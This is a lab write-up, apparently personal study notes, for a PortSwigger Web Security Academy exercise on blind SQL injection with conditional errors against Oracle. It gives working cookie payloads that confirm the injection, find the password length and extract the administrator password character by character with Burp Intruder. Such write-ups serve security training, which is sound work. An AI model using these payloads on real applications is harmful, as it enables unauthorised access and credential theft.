# Blind SQL Injection with Conditional Errors



**Platform:** PortSwigger Web Security Academy

**Difficulty:** Practitioner

**Type:** Blind SQL Injection

**Database:** Oracle

**Status:** Solved



## 🎯 Objective



Exploit the `TrackingId` cookie to extract the `administrator` password from the `users` table.



## 🧠 Core Idea



The application does not return SQL results, but it returns an error when the SQL query fails.



So we create a conditional error:



```sql

CASE WHEN (condition)

THEN TO_CHAR(1/0)

ELSE ''

END

```



Therefore:



```text

Error / HTTP 500 → Condition TRUE ✅

No Error / HTTP 200 → Condition FALSE ❌

```



## 1. Confirm SQL Injection



```text

TrackingId=xyz'

```



→ Error



```text

TrackingId=xyz''

```


→ No Error



## 2. Identify Oracle



```text

TrackingId=xyz'||(SELECT '' FROM dual)||'

```



`dual` indicates an Oracle database.



Test SQL execution:



```text

TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'

```



→ Error → SQL injection confirmed.



## 3. Confirm `users` Table



```text

TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'

```



→ No Error → `users` exists.



## 4. Test a Condition



TRUE:



```text

TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

```



→ Error



FALSE:



```text

TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

```




→ No Error



**Rule:**



> Error = TRUE



## 5. Confirm Administrator



```text

TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

```



→ Error → `administrator` exists.



## 6. Find Password Length



Test:



```text

TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>N THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE 
username='administrator')||'

```



Increase `N` until the error disappears.



**Password length = 20**



## 7. Extract Password Characters



Use:



```text

TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE 
username='administrator')||'
```






Send to **Burp Intruder**.



Payloads:



```text

a-z

0-9

```


The result with:



```text

HTTP 500

```



contains the correct character.



Change the position:



```text


SUBSTR(password,1,1)

SUBSTR(password,2,1)

SUBSTR(password,3,1)

...

SUBSTR(password,20,1)

```



Repeat until all 20 characters are recovered.



## 🔑 Key Takeaways



```text

Blind SQLi

    ↓

Conditional Error

    ↓

TRUE  → SQL Error → HTTP 500

FALSE → No Error  → HTTP 200

    ↓

LENGTH() → Password length

    ↓

SUBSTR() → Extract characters

    ↓

Intruder → Test a-z + 0-9

```



**Main concept to remember:**



> **Error = TRUE, HTTP 500 = Correct character.**



### References



* [PortSwigger — Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
* [PortSwigger — Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)
